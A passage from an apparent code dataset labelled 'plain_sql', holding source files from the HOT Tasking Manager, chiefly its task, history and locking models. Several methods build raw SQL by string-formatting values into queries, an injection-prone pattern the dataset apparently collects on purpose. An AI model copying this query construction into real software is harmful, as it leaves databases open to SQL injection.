elif target == 'bad_imagery':\n            return int((tasks_bad_imagery / total_tasks) * 100)\n\n    def as_dto_for_admin(self, project_id):\n        \"\"\" Creates a Project DTO suitable for transmitting to project admins \"\"\"\n        project, project_dto = self._get_project_and_base_dto()\n\n        if project is None:\n            return None\n\n        project_dto.project_info_locales = ProjectInfo.get_dto_for_all_locales(project_id)\n\n        return project_dto\n\n\n# Add index on project geometry\ndb.Index('idx_geometry', Project.geometry, postgresql_using='gist')\n",
        "dataset": "plain_sql.json"
    },
    {
        "html_url": " https://github.com/hotosm/tasking-manager/blob/982d51fcf4f6ab6b1453bebad065999bba5e8942",
        "file_path": "/server/models/postgis/task.py",
        "source": "import bleach\nimport datetime\nimport geojson\nimport json\nfrom enum import Enum\nfrom flask import current_app\nfrom sqlalchemy.orm.exc import NoResultFound, MultipleResultsFound\nfrom sqlalchemy.orm.session import make_transient\nfrom geoalchemy2 import Geometry\nfrom server import db\nfrom typing import List\nfrom server.models.dtos.mapping_dto import TaskDTO, TaskHistoryDTO\nfrom server.models.dtos.task_annotation_dto import TaskAnnotationDTO \nfrom server.models.dtos.validator_dto import MappedTasksByUser, MappedTasks, InvalidatedTask, InvalidatedTasks\nfrom server.models.dtos.project_dto import ProjectComment, ProjectCommentsDTO\nfrom server.models.dtos.mapping_issues_dto import TaskMappingIssueDTO\nfrom server.models.postgis.statuses import TaskStatus, MappingLevel\nfrom server.models.postgis.user import User\nfrom server.models.postgis.utils import InvalidData, InvalidGeoJson, ST_GeomFromGeoJSON, ST_SetSRID, timestamp, parse_duration, NotFound\nfrom server.models.postgis.task_annotation import TaskAnnotation\n\n\nclass TaskAction(Enum):\n    \"\"\" Describes the possible actions that can happen to to a task, that we'll record history for \"\"\"\n    LOCKED_FOR_MAPPING = 1\n    LOCKED_FOR_VALIDATION = 2\n    STATE_CHANGE = 3\n    COMMENT = 4\n    AUTO_UNLOCKED_FOR_MAPPING = 5\n    AUTO_UNLOCKED_FOR_VALIDATION = 6\n\n\nclass TaskInvalidationHistory(db.Model):\n    \"\"\" Describes the most recent history of task invalidation and subsequent validation \"\"\"\n    __tablename__ = \"task_invalidation_history\"\n    id = db.Column(db.Integer, primary_key=True)\n    project_id = db.Column(db.Integer, db.ForeignKey('projects.id'), nullable=False)\n    task_id = db.Column(db.Integer, nullable=False)\n    is_closed = db.Column(db.Boolean, default=False)\n    mapper_id = db.Column(db.BigInteger, db.ForeignKey('users.id', name='fk_mappers'))\n    mapped_date = db.Column(db.DateTime)\n    invalidator_id = db.Column(db.BigInteger, db.ForeignKey('users.id', name='fk_invalidators'))\n    invalidated_date = db.Column(db.DateTime)\n    invalidation_history_id = db.Column(db.Integer, db.ForeignKey('task_history.id', name='fk_invalidation_history'))\n    validator_id = db.Column(db.BigInteger, db.ForeignKey('users.id', name='fk_validators'))\n    validated_date = db.Column(db.DateTime)\n    updated_date = db.Column(db.DateTime, default=timestamp)\n\n    __table_args__ = (db.ForeignKeyConstraint([task_id, project_id], ['tasks.id', 'tasks.project_id'], name='fk_tasks'),\n                      db.Index('idx_task_validation_history_composite', 'task_id', 'project_id'),\n                      db.Index('idx_task_validation_mapper_status_composite', 'invalidator_id', 'is_closed'),\n                      db.Index('idx_task_validation_mapper_status_composite', 'mapper_id', 'is_closed'),\n                      {})\n\n    def __init__(self, project_id, task_id):\n        self.project_id = project_id\n        self.task_id = task_id\n        self.is_closed = False\n\n    def delete(self):\n        \"\"\" Deletes the current model from the DB \"\"\"\n        db.session.delete(self)\n        db.session.commit()\n\n    @staticmethod\n    def get_open_for_task(project_id, task_id):\n        return TaskInvalidationHistory.query.filter_by(task_id=task_id, project_id=project_id, is_closed=False).one_or_none()\n\n    @staticmethod\n    def close_all_for_task(project_id, task_id):\n        TaskInvalidationHistory.query.filter_by(task_id=task_id, project_id=project_id, is_closed=False) \\\n                               .update({\"is_closed\": True})\n\n    @staticmethod\n    def record_invalidation(project_id, task_id, invalidator_id, history):\n        # Invalidation always kicks off a new entry for a task, so close any existing ones.\n        TaskInvalidationHistory.close_all_for_task(project_id, task_id)\n\n        last_mapped = TaskHistory.get_last_mapped_action(project_id, task_id)\n        if last_mapped is None:\n            return\n\n        entry = TaskInvalidationHistory(project_id, task_id)\n        entry.invalidation_history_id = history.id\n        entry.mapper_id = last_mapped.user_id\n        entry.mapped_date = last_mapped.action_date\n        entry.invalidator_id = invalidator_id\n        entry.invalidated_date = history.action_date\n        entry.updated_date = timestamp()\n        db.session.add(entry)\n\n    @staticmethod\n    def record_validation(project_id, task_id, validator_id, history):\n        entry = TaskInvalidationHistory.get_open_for_task(project_id, task_id)\n\n        # If no open invalidation to update, then nothing to do\n        if entry is None:\n            return\n\n        last_mapped = TaskHistory.get_last_mapped_action(project_id, task_id)\n        entry.mapper_id = last_mapped.user_id\n        entry.mapped_date = last_mapped.action_date\n        entry.validator_id = validator_id\n        entry.validated_date = history.action_date\n        entry.is_closed = True\n        entry.updated_date = timestamp()\n\n\nclass TaskMappingIssue(db.Model):\n    \"\"\" Describes an issue (along with an occurrence count) with a task mapping that contributed to invalidation of the task \"\"\"\n    __tablename__ = \"task_mapping_issues\"\n    id = db.Column(db.Integer, primary_key=True)\n    task_history_id = db.Column(db.Integer, db.ForeignKey('task_history.id'), nullable=False, index=True)\n    issue = db.Column(db.String, nullable=False)\n    mapping_issue_category_id = db.Column(db.Integer, db.ForeignKey('mapping_issue_categories.id', name='fk_issue_category'), nullable=False)\n    count = db.Column(db.Integer, nullable=False)\n\n    def __init__(self, issue, count, mapping_issue_category_id, task_history_id=None):\n        self.task_history_id = task_history_id\n        self.issue = issue\n        self.count = count\n        self.mapping_issue_category_id = mapping_issue_category_id\n\n    def delete(self):\n        \"\"\" Deletes the current model from the DB \"\"\"\n        db.session.delete(self)\n        db.session.commit()\n\n    def as_dto(self):\n        issue_dto = TaskMappingIssueDTO()\n        issue_dto.category_id = self.mapping_issue_category_id\n        issue_dto.name = self.issue\n        issue_dto.count = self.count\n        return issue_dto\n\n    def __repr__(self):\n        return \"{0}: {1}\".format(self.issue, self.count)\n\n\nclass TaskHistory(db.Model):\n    \"\"\" Describes the history associated with a task \"\"\"\n    __tablename__ = \"task_history\"\n\n    id = db.Column(db.Integer, primary_key=True)\n    project_id = db.Column(db.Integer, db.ForeignKey('projects.id'), index=True)\n    task_id = db.Column(db.Integer, nullable=False)\n    action = db.Column(db.String, nullable=False)\n    action_text = db.Column(db.String)\n    action_date = db.Column(db.DateTime, nullable=False, default=timestamp)\n    user_id = db.Column(db.BigInteger, db.ForeignKey('users.id', name='fk_users'), nullable=False)\n    invalidation_history = db.relationship(TaskInvalidationHistory, lazy='dynamic', cascade='all')\n\n    actioned_by = db.relationship(User)\n    task_mapping_issues = db.relationship(TaskMappingIssue, cascade=\"all\")\n\n    __table_args__ = (db.ForeignKeyConstraint([task_id, project_id], ['tasks.id', 'tasks.project_id'], name='fk_tasks'),\n                      db.Index('idx_task_history_composite', 'task_id', 'project_id'), {})\n\n    def __init__(self, task_id, project_id, user_id):\n        self.task_id = task_id\n        self.project_id = project_id\n        self.user_id = user_id\n\n    def set_task_locked_action(self, task_action: TaskAction):\n        if task_action not in [TaskAction.LOCKED_FOR_MAPPING, TaskAction.LOCKED_FOR_VALIDATION]:\n            raise ValueError('Invalid Action')\n\n        self.action = task_action.name\n\n    def set_comment_action(self, comment):\n        self.action = TaskAction.COMMENT.name\n        clean_comment = bleach.clean(comment)  # Bleach input to ensure no nefarious script tags etc\n        self.action_text = clean_comment\n\n    def set_state_change_action(self, new_state):\n        self.action = TaskAction.STATE_CHANGE.name\n        self.action_text = new_state.name\n\n    def set_auto_unlock_action(self, task_action: TaskAction):\n        self.action = task_action.name\n\n    def delete(self):\n        \"\"\" Deletes the current model from the DB \"\"\"\n        db.session.delete(self)\n        db.session.commit()\n\n    @staticmethod\n    def update_task_locked_with_duration(task_id: int, project_id: int, lock_action: TaskStatus, user_id: int):\n        \"\"\"\n        Calculates the duration a task was locked for and sets it on the history record\n        :param task_id: Task in scope\n        :param project_id: Project ID in scope\n        :param lock_action: The lock action, either Mapping or Validation\n        :param user_id: Logged in user updating the task\n        :return:\n        \"\"\"\n        try:\n            last_locked = TaskHistory.query.filter_by(task_id=task_id, project_id=project_id, action=lock_action.name,\n                                                      action_text=None, user_id=user_id).one()\n        except NoResultFound:\n            # We suspect there's some kind or race condition that is occasionally deleting history records\n            # prior to user unlocking task. Most likely stemming from auto-unlock feature. However, given that\n            # we're trying to update a row that doesn't exist, it's better to return without doing anything\n            # rather than showing the user an error that they can't fix\n            return\n        except MultipleResultsFound:\n            # Again race conditions may mean we have multiple rows within the Task History.  Here we attempt to\n            # remove the oldest duplicate rows, and update the newest on the basis that this was the last action\n            # the user was attempting to make.\n            TaskHistory.remove_duplicate_task_history_rows(task_id, project_id, lock_action, user_id)\n\n            # Now duplicate is removed, we recursively call ourself to update the duration on the remaining row\n            TaskHistory.update_task_locked_with_duration(task_id, project_id, lock_action, user_id)\n            return\n\n        duration_task_locked = datetime.datetime.utcnow() - last_locked.action_date\n        # Cast duration to isoformat for later transmission via api\n        last_locked.action_text = (datetime.datetime.min + duration_task_locked).time().isoformat()\n        db.session.commit()\n\n    @staticmethod\n    def remove_duplicate_task_history_rows(task_id: int, project_id: int, lock_action: TaskStatus, user_id: int):\n        \"\"\" Method used in rare cases where we have duplicate task history records for a given action by a user\n            This method will remove the oldest duplicate record, on the basis that the newest record was the\n            last action the user was attempting to perform\n        \"\"\"\n        dupe = TaskHistory.query.filter(TaskHistory.project_id == project_id,\n                                        TaskHistory.task_id == task_id,\n                                        TaskHistory.action == lock_action.name,\n                                        TaskHistory.user_id == user_id).order_by(TaskHistory.id.asc()).first()\n\n        dupe.delete()\n\n    @staticmethod\n    def update_expired_and_locked_actions(project_id: int, task_id: int, expiry_date: datetime, action_text: str):\n        \"\"\"\n        Sets auto unlock state to all not finished actions, that are older then the expiry date.\n        Action is considered as a not finished, when it is in locked state and doesn't have action text\n        :param project_id: Project ID in scope\n        :param task_id: Task in scope\n        :param expiry_date: Action created before this date is treated as expired\n        :param action_text: Text which will be set for all changed actions\n        :return:\n        \"\"\"\n        all_expired = TaskHistory.query.filter(\n            TaskHistory.task_id == task_id,\n            TaskHistory.project_id == project_id,\n            TaskHistory.action_text.is_(None),\n            TaskHistory.action.in_([TaskAction.LOCKED_FOR_VALIDATION.name, TaskAction.LOCKED_FOR_MAPPING.name]),\n            TaskHistory.action_date <= expiry_date).all()\n\n        for task_history in all_expired:\n            unlock_action = TaskAction.AUTO_UNLOCKED_FOR_MAPPING if task_history.action == 'LOCKED_FOR_MAPPING' \\\n                else TaskAction.AUTO_UNLOCKED_FOR_VALIDATION\n\n            task_history.set_auto_unlock_action(unlock_action)\n            task_history.action_text = action_text\n\n        db.session.commit()\n\n    @staticmethod\n    def get_all_comments(project_id: int) -> ProjectCommentsDTO:\n        \"\"\" Gets all comments for the supplied project_id\"\"\"\n\n        comments = db.session.query(TaskHistory.task_id,\n                                    TaskHistory.action_date,\n                                    TaskHistory.action_text,\n                                    User.username) \\\n            .join(User) \\\n            .filter(TaskHistory.project_id == project_id, TaskHistory.action == TaskAction.COMMENT.name).all()\n\n        comments_dto = ProjectCommentsDTO()\n        for comment in comments:\n            dto = ProjectComment()\n            dto.comment = comment.action_text\n            dto.comment_date = comment.action_date\n            dto.user_name = comment.username\n            dto.task_id = comment.task_id\n            comments_dto.comments.append(dto)\n\n        return comments_dto\n\n    @staticmethod\n    def get_last_status(project_id: int, task_id: int, for_undo: bool = False):\n        \"\"\" Get the status the task was set to the last time the task had a STATUS_CHANGE\"\"\"\n        result = db.session.query(TaskHistory.action_text) \\\n            .filter(TaskHistory.project_id == project_id,\n                    TaskHistory.task_id == task_id,\n                    TaskHistory.action == TaskAction.STATE_CHANGE.name) \\\n            .order_by(TaskHistory.action_date.desc()).all()\n\n        if not result:\n            return TaskStatus.READY  # No result so default to ready status\n\n        if len(result) == 1 and for_undo:\n            # We're looking for the previous status, however, there isn't any so we'll return Ready\n            return TaskStatus.READY\n\n        if for_undo and result[0][0] in [TaskStatus.MAPPED.name, TaskStatus.BADIMAGERY.name]:\n            # We need to return a READY when last status of the task is badimagery or mapped.\n            return TaskStatus.READY\n\n        if for_undo:\n            # Return the second last status which was status the task was previously set to\n            return TaskStatus[result[1][0]]\n        else:\n            return TaskStatus[result[0][0]]\n\n    @staticmethod\n    def get_last_action(project_id: int, task_id: int):\n        \"\"\"Gets the most recent task history record for the task\"\"\"\n        return TaskHistory.query.filter(TaskHistory.project_id == project_id,\n                                        TaskHistory.task_id == task_id) \\\n            .order_by(TaskHistory.action_date.desc()).first()\n\n    @staticmethod\n    def get_last_action_of_type(project_id: int, task_id: int, allowed_task_actions: list):\n        \"\"\"Gets the most recent task history record having provided TaskAction\"\"\"\n        return TaskHistory.query.filter(TaskHistory.project_id == project_id,\n                                        TaskHistory.task_id == task_id,\n                                        TaskHistory.action.in_(allowed_task_actions)) \\\n            .order_by(TaskHistory.action_date.desc()).first()\n\n    @staticmethod\n    def get_last_locked_action(project_id: int, task_id: int):\n        \"\"\"Gets the most recent task history record with locked action for the task\"\"\"\n        return TaskHistory.get_last_action_of_type(\n            project_id, task_id,\n            [TaskAction.LOCKED_FOR_MAPPING.name, TaskAction.LOCKED_FOR_VALIDATION.name])\n\n    @staticmethod\n    def get_last_locked_or_auto_unlocked_action(project_id: int, task_id: int):\n        \"\"\"Gets the most recent task history record with locked or auto unlocked action for the task\"\"\"\n        return TaskHistory.get_last_action_of_type(\n            project_id, task_id,\n            [TaskAction.LOCKED_FOR_MAPPING.name, TaskAction.LOCKED_FOR_VALIDATION.name,\n             TaskAction.AUTO_UNLOCKED_FOR_MAPPING.name, TaskAction.AUTO_UNLOCKED_FOR_VALIDATION.name])\n\n    def get_last_mapped_action(project_id: int, task_id: int):\n        \"\"\"Gets the most recent mapped action, if any, in the task history\"\"\"\n        return db.session.query(TaskHistory) \\\n            .filter(TaskHistory.project_id == project_id,\n                    TaskHistory.task_id == task_id,\n                    TaskHistory.action == TaskAction.STATE_CHANGE.name,\n                    TaskHistory.action_text.in_([TaskStatus.BADIMAGERY.name, TaskStatus.MAPPED.name])) \\\n            .order_by(TaskHistory.action_date.desc()).first()\n\n\nclass Task(db.Model):\n    \"\"\" Describes an individual mapping Task \"\"\"\n    __tablename__ = \"tasks\"\n\n    # Table has composite PK on (id and project_id)\n    id = db.Column(db.Integer, primary_key=True)\n    project_id = db.Column(db.Integer, db.ForeignKey('projects.id'), index=True, primary_key=True)\n    x = db.Column(db.Integer)\n    y = db.Column(db.Integer)\n    zoom = db.Column(db.Integer)\n    extra_properties = db.Column(db.Unicode)\n    # Tasks need to be split differently if created from an arbitrary grid or were clipped to the edge of the AOI\n    is_square = db.Column(db.Boolean, default=True)\n    geometry = db.Column(Geometry('MULTIPOLYGON', srid=4326))\n    task_status = db.Column(db.Integer, default=TaskStatus.READY.value)\n    locked_by = db.Column(db.BigInteger, db.ForeignKey('users.id', name='fk_users_locked'))\n    mapped_by = db.Column(db.BigInteger, db.ForeignKey('users.id', name='fk_users_mapper'))\n    validated_by = db.Column(db.BigInteger, db.ForeignKey('users.id', name='fk_users_validator'))\n\n    # Mapped objects\n    task_history = db.relationship(TaskHistory, cascade=\"all\")\n    task_annotations = db.relationship(TaskAnnotation, cascade=\"all\")\n    lock_holder = db.relationship(User, foreign_keys=[locked_by])\n    mapper = db.relationship(User, foreign_keys=[mapped_by])\n\n    def create(self):\n        \"\"\" Creates and saves the current model to the DB \"\"\"\n        db.session.add(self)\n        db.session.commit()\n\n    def update(self):\n        \"\"\" Updates the DB with the current state of the Task \"\"\"\n        db.session.commit()\n\n    def delete(self):\n        \"\"\" Deletes the current model from the DB \"\"\"\n        db.session.delete(self)\n        db.session.commit()\n\n    @classmethod\n    def from_geojson_feature(cls, task_id, task_feature):\n        \"\"\"\n        Constructs and validates a task from a GeoJson feature object\n        :param task_id: Unique ID for the task\n        :param task_feature: A geoJSON feature object\n        :raises InvalidGeoJson, InvalidData\n        \"\"\"\n        if type(task_feature) is not geojson.Feature:\n            raise InvalidGeoJson('Task: Invalid GeoJson should be a feature')\n\n        task_geometry = task_feature.geometry\n\n        if type(task_geometry) is not geojson.MultiPolygon:\n            raise InvalidGeoJson('Task: Geometry must be a MultiPolygon')\n\n        is_valid_geojson = geojson.is_valid(task_geometry)\n        if is_valid_geojson['valid'] == 'no':\n            raise InvalidGeoJson(f\"Task: Invalid MultiPolygon - {is_valid_geojson['message']}\")\n\n        task = cls()\n        try:\n            task.x = task_feature.properties['x']\n            task.y = task_feature.properties['y']\n            task.zoom = task_feature.properties['zoom']\n            task.is_square = task_feature.properties['isSquare']\n        except KeyError as e:\n            raise InvalidData(f'Task: Expected property not found: {str(e)}')\n\n        if 'extra_properties' in task_feature.properties:\n            task.extra_properties = json.dumps(\n                task_feature.properties['extra_properties'])\n\n        task.id = task_id\n        task_geojson = geojson.dumps(task_geometry)\n        task.geometry = ST_SetSRID(ST_GeomFromGeoJSON(task_geojson), 4326)\n\n        return task\n\n    @staticmethod\n    def get(task_id: int, project_id: int):\n        \"\"\"\n        Gets specified task\n        :param task_id: task ID in scope\n        :param project_id: project ID in scope\n        :return: Task if found otherwise None\n        \"\"\"\n        # LIKELY PROBLEM AREA\n\n        return Task.query.filter_by(id=task_id, project_id=project_id).one_or_none()\n\n    @staticmethod\n    def get_tasks(project_id: int, task_ids: List[int]):\n        \"\"\" Get all tasks that match supplied list \"\"\"\n        return Task.query.filter(Task.project_id == project_id, Task.id.in_(task_ids)).all()\n\n    @staticmethod\n    def get_all_tasks(project_id: int):\n        \"\"\" Get all tasks for a given project \"\"\"\n        return Task.query.filter(Task.project_id == project_id).all()\n\n    @staticmethod\n    def auto_unlock_delta():\n      return parse_duration(current_app.config['TASK_AUTOUNLOCK_AFTER'])\n\n    @staticmethod\n    def auto_unlock_tasks(project_id: int):\n        \"\"\"Unlock all tasks locked for longer than the auto-unlock delta\"\"\"\n        expiry_delta = Task.auto_unlock_delta()\n        lock_duration = (datetime.datetime.min + expiry_delta).time().isoformat()\n        expiry_date = datetime.datetime.utcnow() - expiry_delta\n        old_locks_query = '''SELECT t.id\n            FROM tasks t, task_history th\n            WHERE t.id = th.task_id\n            AND t.project_id = th.project_id\n            AND t.task_status IN (1,3)\n            AND th.action IN ( 'LOCKED_FOR_VALIDATION','LOCKED_FOR_MAPPING' )\n            AND th.action_text IS NULL\n            AND t.project_id = {0}\n            AND th.action_date <= '{1}'\n            '''.format(project_id, str(expiry_date))\n\n        old_tasks = db.engine.execute(old_locks_query)\n\n        if old_tasks.rowcount == 0:\n            # no tasks older than the delta found, return without further processing\n            return\n\n        for old_task in old_tasks:\n            task = Task.get(old_task[0], project_id)\n            task.auto_unlock_expired_tasks(expiry_date, lock_duration)\n\n    def auto_unlock_expired_tasks(self, expiry_date, lock_duration):\n        \"\"\"Unlock all tasks locked before expiry date. Clears task lock if needed\"\"\"\n        TaskHistory.update_expired_and_locked_actions(self.project_id, self.id, expiry_date, lock_duration)\n\n        last_action = TaskHistory.get_last_locked_or_auto_unlocked_action(self.project_id, self.id)\n        if last_action.action in ['AUTO_UNLOCKED_FOR_MAPPING', 'AUTO_UNLOCKED_FOR_VALIDATION']:\n            self.clear_lock()\n\n    def is_mappable(self):\n        \"\"\" Determines if task in scope is in suitable state for mapping \"\"\"\n        if TaskStatus(self.task_status) not in [TaskStatus.READY, TaskStatus.INVALIDATED]:\n            return False\n\n        return True\n\n    def set_task_history(self, action, user_id, comment=None, new_state=None, mapping_issues=None):\n        \"\"\"\n        Sets the task history for the action that the user has just performed\n        :param task: Task in scope\n        :param user_id: ID of user performing the action\n        :param action: Action the user has performed\n        :param comment: Comment user has added\n        :param new_state: New state of the task\n        :param mapping_issues: Identified issues leading to invalidation\n        \"\"\"\n        history = TaskHistory(self.id, self.project_id, user_id)\n\n        if action in [TaskAction.LOCKED_FOR_MAPPING, TaskAction.LOCKED_FOR_VALIDATION]:\n            history.set_task_locked_action(action)\n        elif action == TaskAction.COMMENT:\n            history.set_comment_action(comment)\n        elif action == TaskAction.STATE_CHANGE:\n            history.set_state_change_action(new_state)\n        elif action in [TaskAction.AUTO_UNLOCKED_FOR_MAPPING, TaskAction.AUTO_UNLOCKED_FOR_VALIDATION]:\n            history.set_auto_unlock_action(action)\n\n        if mapping_issues is not None:\n            history.task_mapping_issues = mapping_issues\n\n        self.task_history.append(history)\n        return history\n\n    def lock_task_for_mapping(self, user_id: int):\n        self.set_task_history(TaskAction.LOCKED_FOR_MAPPING, user_id)\n        self.task_status = TaskStatus.LOCKED_FOR_MAPPING.value\n        self.locked_by = user_id\n        self.update()\n\n    def lock_task_for_validating(self, user_id: int):\n        self.set_task_history(TaskAction.LOCKED_FOR_VALIDATION, user_id)\n        self.task_status = TaskStatus.LOCKED_FOR_VALIDATION.value\n        self.locked_by = user_id\n        self.update()\n\n    def reset_task(self, user_id: int):\n        if TaskStatus(self.task_status) in [TaskStatus.LOCKED_FOR_MAPPING, TaskStatus.LOCKED_FOR_VALIDATION]:\n            self.record_auto_unlock()\n\n        self.set_task_history(TaskAction.STATE_CHANGE, user_id, None, TaskStatus.READY)\n        self.mapped_by = None\n        self.validated_by = None\n        self.locked_by = None\n        self.task_status = TaskStatus.READY.value\n        self.update()\n\n    def clear_task_lock(self):\n        \"\"\"\n        Unlocks task in scope in the database.  Clears the lock as though it never happened.\n        No history of the unlock is recorded.\n        :return:\n        \"\"\"\n        # clear the lock action for the task in the task history\n        last_action = TaskHistory.get_last_locked_action(self.project_id, self.id)\n        last_action.delete()\n\n        # Set locked_by to null and status to last status on task\n        self.clear_lock()\n\n    def record_auto_unlock(self, lock_duration):\n        locked_user = self.locked_by\n        last_action = TaskHistory.get_last_locked_action(self.project_id, self.id)\n        next_action = TaskAction.AUTO_UNLOCKED_FOR_MAPPING if last_action.action == 'LOCKED_FOR_MAPPING' \\\n            else TaskAction.AUTO_UNLOCKED_FOR_VALIDATION\n\n        self.clear_task_lock()\n\n        # Add AUTO_UNLOCKED action in the task history\n        auto_unlocked = self.set_task_history(action=next_action, user_id=locked_user)\n        auto_unlocked.action_text = lock_duration\n        self.update()\n\n    def unlock_task(self, user_id, new_state=None, comment=None, undo=False, issues=None):\n        \"\"\" Unlock task and ensure duration task locked is saved in History \"\"\"\n        if comment:\n            self.set_task_history(action=TaskAction.COMMENT, comment=comment, user_id=user_id, mapping_issues=issues)\n\n        history = self.set_task_history(action=TaskAction.STATE_CHANGE, new_state=new_state,\n                                        user_id=user_id, mapping_issues=issues)\n\n        if new_state in [TaskStatus.MAPPED, TaskStatus.BADIMAGERY] and TaskStatus(self.task_status) != TaskStatus.LOCKED_FOR_VALIDATION:\n            # Don't set mapped if state being set back to mapped after validation\n            self.mapped_by = user_id\n        elif new_state == TaskStatus.VALIDATED:\n            TaskInvalidationHistory.record_validation(self.project_id, self.id, user_id, history)\n            self.validated_by = user_id\n        elif new_state == TaskStatus.INVALIDATED:\n            TaskInvalidationHistory.record_invalidation(self.project_id, self.id, user_id, history)\n            self.mapped_by = None\n            self.validated_by = None\n\n        if not undo:\n            # Using a slightly evil side effect of Actions and Statuses having the same name here :)\n            TaskHistory.update_task_locked_with_duration(self.id, self.project_id, TaskStatus(self.task_status), user_id)\n\n        self.task_status = new_state.value\n        self.locked_by = None\n        self.update()\n\n    def reset_lock(self, user_id, comment=None):\n        \"\"\" Removes a current lock from a task, resets to last status and updates history with duration of lock \"\"\"\n        if comment:\n            self.set_task_history(action=TaskAction.COMMENT, comment=comment, user_id=user_id)\n\n        # Using a slightly evil side effect of Actions and Statuses having the same name here :)\n        TaskHistory.update_task_locked_with_duration(self.id, self.project_id, TaskStatus(self.task_status), user_id)\n        self.clear_lock()\n\n    def clear_lock(self):\n        \"\"\" Resets to last status and removes current lock from a task \"\"\"\n        self.task_status = TaskHistory.get_last_status(self.project_id, self.id).value\n        self.locked_by = None\n        self.update()\n\n    @staticmethod\n    def get_tasks_as_geojson_feature_collection(project_id):\n        \"\"\"\n        Creates a geoJson.FeatureCollection object for all tasks related to the supplied project ID\n        :param project_id: Owning project ID\n        :return: geojson.FeatureCollection\n        \"\"\"\n        project_tasks = \\\n            db.session.query(Task.id, Task.x, Task.y, Task.zoom, Task.is_square, Task.task_status,\n                             Task.geometry.ST_AsGeoJSON().label('geojson')).filter(Task.project_id == project_id).all()\n\n        tasks_features = []\n        for task in project_tasks:\n            task_geometry = geojson.loads(task.geojson)\n            task_properties = dict(taskId=task.id, taskX=task.x, taskY=task.y, taskZoom=task.zoom,\n                                   taskIsSquare=task.is_square, taskStatus=TaskStatus(task.task_status).name)\n\n            feature = geojson.Feature(geometry=task_geometry, properties=task_properties)\n            tasks_features.append(feature)\n\n        return geojson.FeatureCollection(tasks_features)\n\n    @staticmethod\n    def get_tasks_as_geojson_feature_collection_no_geom(project_id):\n        \"\"\"\n        Creates a geoJson.FeatureCollection object for all tasks related to the supplied project ID without geometry\n        :param project_id: Owning project ID\n        :return: geojson.FeatureCollection\n        \"\"\"\n        project_tasks = \\\n            db.session.query(Task.id, Task.x, Task.y, Task.zoom, Task.is_square, Task.task_status) \\\n                             .filter(Task.project_id == project_id).all()\n\n        tasks_features = []\n        for task in project_tasks:\n            task_properties = dict(taskId=task.id, taskX=task.x, taskY=task.y, taskZoom=task.zoom,\n                                   taskIsSquare=task.is_square, taskStatus=TaskStatus(task.task_status).name)\n\n            feature = geojson.Feature(properties=task_properties)\n            tasks_features.append(feature)\n\n        return geojson.FeatureCollection(tasks_features)\n\n    @staticmethod\n    def get_mapped_tasks_by_user(project_id: int):\n        \"\"\" Gets all mapped tasks for supplied project grouped by user\"\"\"\n\n        # Raw SQL is easier to understand that SQL alchemy here :)\n        sql = \"\"\"select u.username, u.mapping_level, count(distinct(t.id)), json_agg(distinct(t.id)),\n                            max(th.action_date) last_seen, u.date_registered, u.last_validation_date\n                      from tasks t,\n                           task_history th,\n                           users u\n                     where t.project_id = th.project_id\n                       and t.id = th.task_id\n                       and t.mapped_by = u.id\n                       and t.project_id = {0}\n                       and t.task_status = 2\n                       and th.action_text = 'MAPPED'\n                     group by u.username, u.mapping_level, u.date_registered, u.last_validation_date\"\"\".format(project_id)\n\n        results = db.engine.execute(sql)\n        if results.rowcount == 0:\n            raise NotFound()\n\n        mapped_tasks_dto = MappedTasks()\n        for row in results:\n            user_mapped = MappedTasksByUser()\n            user_mapped.username = row[0]\n            user_mapped.mapping_level = MappingLevel(row[1]).name\n            user_mapped.mapped_task_count = row[2]\n            user_mapped.tasks_mapped = row[3]\n            user_mapped.last_seen = row[4]\n            user_mapped.date_registered = row[5]\n            user_mapped.last_validation_date = row[6]\n\n            mapped_tasks_dto.mapped_tasks.append(user_mapped)\n\n        return mapped_tasks_dto\n\n    @staticmethod\n    def get_max_task_id_for_project(project_id: int):\n        \"\"\"Gets the nights task id currently in use on a project\"\"\"\n        sql = \"\"\"select max(id) from tasks where project_id = {0} GROUP BY project_id\"\"\".format(project_id)\n        result = db.engine.execute(sql)\n        if result.rowcount == 0:\n            raise NotFound()\n        for row in result:\n            return row[0]\n\n    def as_dto_with_instructions(self, preferred_locale: str = 'en') -> TaskDTO:\n        \"\"\" Get dto with any task instructions \"\"\"\n        task_history = []\n        for action in self.task_history:\n            history = TaskHistoryDTO()\n            history.history_id = action.id\n            history.action = action.action\n            history.action_text = action.action_text\n            history.action_date = action.action_date\n            history.action_by = action.actioned_by.username if action.actioned_by else None\n            if action.task_mapping_issues:\n                history.issues = [issue.as_dto() for issue in action.task_mapping_issues]\n\n            task_history.append(history)\n\n        task_dto = TaskDTO()\n        task_dto.task_id = self.id\n        task_dto.project_id = self.project_id\n        task_dto.task_status = TaskStatus(self.task_status).name\n        task_dto.lock_holder = self.lock_holder.username if self.lock_holder else None\n        task_dto.task_history = task_history\n        task_dto.auto_unlock_seconds = Task.auto_unlock_delta().total_seconds()\n\n        per_task_instructions = self.get_per_task_instructions(preferred_locale)\n\n        # If we don't have instructions in preferred locale try again for default locale\n        task_dto.per_task_instructions = per_task_instructions if per_task_instructions else self.get_per_task_instructions(\n            self.projects.default_locale)\n\n        annotations = self.get_per_task_annotations()\n        task_dto.task_annotations = annotations if annotations else  [] \n\n        return task_dto\n\n    def get_per_task_annotations(self):\n        result = [ta.get_dto() for ta in self.task_annotations]\n        return result\n\n    def get_per_task_instructions(self, search_locale: str) -> str:\n        \"\"\" Gets any per task instructions attached to the project \"\"\"\n        project_info = self.projects.project_info.all()\n\n        for info in project_info:\n            if info.locale == search_locale:\n                return self.format_per_task_instructions(info.per_task_instructions)\n\n    def format_per_task_instructions(self, instructions) -> str:\n        \"\"\" Format instructions by looking for X, Y, Z tokens and replacing them with the task values \"\"\"\n        if not instructions:\n            return ''  # No instructions so return empty string\n\n        properties = {}\n\n        if self.x:\n            properties['x'] = str(self.x)\n        if self.y:\n            properties['y'] = str(self.y)\n        if self.zoom:\n            properties['z'] = str(self.zoom)\n        if self.extra_properties:\n            properties.update(json.loads(self.extra_properties))\n\n        try:\n            instructions = instructions.format(**properties)\n        except KeyError:\n            pass\n        return instructions\n\n    def copy_task_history(self) -> list:\n        copies = []\n        for entry in self.task_history:\n            db.session.expunge(entry)\n            make_transient(entry)\n            entry.id = None\n            entry.task_id = None\n            db.session.add(entry)\n            copies.append(entry)\n\n        return copies\n",
        "dataset": "plain_sql.json"
    },
    {
        "html_url": " https://github.com/hotosm/tasking-manager/blob/982d51fcf4f6ab6b1453bebad065999bba5e8942",
        "file_path": "/server/models/postgis/user.py",
